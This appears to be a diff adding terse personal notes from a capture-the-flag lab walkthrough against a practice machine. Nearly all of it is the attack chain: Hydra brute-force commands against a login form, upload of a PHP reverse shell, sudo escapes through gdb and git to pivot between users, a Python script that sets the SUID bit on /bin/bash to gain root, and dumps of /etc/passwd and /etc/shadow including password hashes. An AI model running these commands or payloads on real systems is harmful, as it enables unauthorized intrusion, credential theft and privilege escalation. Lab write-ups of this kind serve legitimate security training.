@@ -1,0 +1,229 @@
+https://infinitelogins.com/2020/02/22/how-to-brute-force-websites-using-hydra/
+https://www.youtube.com/watch?v=muyWa_XbjN4
+
+					Enum
+
+(found potential user)
+user:d4rckh
+
+(found dir)
+/admin-dir
+
+(found possible users and passwd lists)
+credentials.txt
+userid > userid.txt
+
+					
+					ftp
+
+(server is anon only)
+(found file)
+test.txt
+
+vsftpd test file
+
+$cd ...
+$cd ...
+
+$get yougotgoodeyes.txt
+
+
+(web directory found)
+$cat yougotgoodeyes.txt
+/sUp3r-s3cr3t
+
+
+				Hydra
+(brute user)
+$sudo hydra -L userid.txt -P credentials.txt 10.10.67.160 http-post-form "/sUp3r-s3cr3t/authenticate.php:username=^USER^&password=^PASS^:Incorrect username"
+
+(brute passwd)
+$sudo hydra -l enox -P credentials.txt 10.10.67.160 http-post-form "/sUp3r-s3cr3t/authenticate.php:username=^USER^&password=^PASS^:Incorrect password!"
+
+(found creds)
+user:enox
+pass:P@ssword1234
+
+
+
+				Access1
+(upload rphp.php)
+(find rshell - gob)
+http://10.10.67.160/sUp3r-s3cr3t/images/uploads/rphp.php
+
+
+				Netcat
+$cd home
+
+(found users)
+
+user:d4rckh
+user:thirtytwo
+
+				
+				Privesc
+
+(stabilize shell)
+
+$ sudo -l
+Matching Defaults entries for www-data on ubuntu-xenial:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on ubuntu-xenial:
+    (thirtytwo) NOPASSWD: /var/www/gdb
+
+
+
+$sudo -u thirtytwo /var/www/gdb -nx -ex '!sh' -ex quit
+
+$whoami
+thirtytwo
+
+$cd 
+
+$cat note.txt
+Hey 32, the other day you were unable to clone my github repository. 
+Now you can use git. Took a while to fix it but now its good :)
+
+~D4rckh
+
+$sudo -l
+Matching Defaults entries for thirtytwo on ubuntu-xenial:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User thirtytwo may run the following commands on ubuntu-xenial:
+    (d4rckh) NOPASSWD: /usr/bin/git
+
+
+$sudo -u d4rckh /usr/bin/git help config
+(press enter than type)
+!bash
+(enter)
+
+
+
+$cd /home/d4rckh
+
+$nano cleanup.py 
+
+# -*- coding: utf-8 -*-
+#!/usr/bin/env python
+import os
+import sys
+try:
+        os.system('chmod +s /bin/bash')
+except:
+        sys.exit()
+
+
+
+
+
+
+(save & exit)
+
+
+(wait for the minute to pass)
+
+(watch -n 0 ls -l /bin/bash)
+
+(Changes to)
+
+-rwsr-sr-x 1 root root 
+
+$/bin/bash -p
+
+$whoami
+root
+
+$cd root
+
+$cat root.txt
+7e055812184a5fa5109d5db5c7eda7cd
+
+
+
+
+
+						$h1+$ and gigs 
+
+
+$cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
+systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
+systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
+systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
+syslog:x:104:108::/home/syslog:/bin/false
+_apt:x:105:65534::/nonexistent:/bin/false
+lxd:x:106:65534::/var/lib/lxd/:/bin/false
+messagebus:x:107:111::/var/run/dbus:/bin/false
+uuidd:x:108:112::/run/uuidd:/bin/false
+dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
+sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
+pollinate:x:111:1::/var/cache/pollinate:/bin/false
+vagrant:x:1000:1000:,,,:/home/vagrant:/bin/bash
+ftp:x:112:118:ftp daemon,,,:/srv/ftp:/bin/false
+mysql:x:113:119:MySQL Server,,,:/nonexistent:/bin/false
+thirtytwo:x:1004:1004::/home/thirtytwo:/bin/bash
+d4rckh:x:1005:1005::/home/d4rckh:/bin/bash
+
+
+
+$cat /etc/shadow
+root:$6$m19ycsig$a2LcuaT7PlLJhsPzzkI5nITVzYiZFBCsLysFYa3FOnd8QhMl7dmjxPErPojvpCwY8Aj1HHaI3JkHBi34BfIHV.:1
+8448:0:99999:7:::
+daemon:*:18443:0:99999:7:::
+bin:*:18443:0:99999:7:::
+sys:*:18443:0:99999:7:::
+sync:*:18443:0:99999:7:::
+games:*:18443:0:99999:7:::
+man:*:18443:0:99999:7:::
+lp:*:18443:0:99999:7:::
+mail:*:18443:0:99999:7:::
+news:*:18443:0:99999:7:::
+uucp:*:18443:0:99999:7:::
+proxy:*:18443:0:99999:7:::
+www-data:*:18443:0:99999:7:::
+backup:*:18443:0:99999:7:::
+list:*:18443:0:99999:7:::
+irc:*:18443:0:99999:7:::
+gnats:*:18443:0:99999:7:::
+nobody:*:18443:0:99999:7:::
+systemd-timesync:*:18443:0:99999:7:::
+systemd-network:*:18443:0:99999:7:::
+systemd-resolve:*:18443:0:99999:7:::
+systemd-bus-proxy:*:18443:0:99999:7:::
+syslog:*:18443:0:99999:7:::
+_apt:*:18443:0:99999:7:::
+lxd:*:18443:0:99999:7:::
+messagebus:*:18443:0:99999:7:::
+uuidd:*:18443:0:99999:7:::
+dnsmasq:*:18443:0:99999:7:::
+sshd:*:18443:0:99999:7:::
+pollinate:*:18443:0:99999:7:::
+vagrant:$6$eT3ad/uz$4qhYiTjyH9OX03kgSeV.ExBVuoZONUPINFM0ZW8ALdhqrPpaDP/2ZlG2M4XYiyGcoWSaTmj2saYEDqSZHV5uX
+0:18443:0:99999:7:::
+ftp:*:18448:0:99999:7:::
+mysql:!:18448:0:99999:7:::
+thirtytwo:$6$qfS/M06z$Tc27PpD0RQrRvgH66OlcAg1GrFdlWzZ7kC41bwj7IzwAUv1bcKGrii/7ogrnRmtLeDq.hlOw2JaQSevHV/A
+xh.:18448:0:99999:7:::
+d4rckh:$6$LaG5HbCu$8u5.spL54QA44aXlh0OgOoYcFqjOr1Qs6Fu.rt3zlXX4BaXzlhSb9clS5viWF2beq.j8shq6uvdLaMF/mZpFV0
+:18448:0:99999:7:::
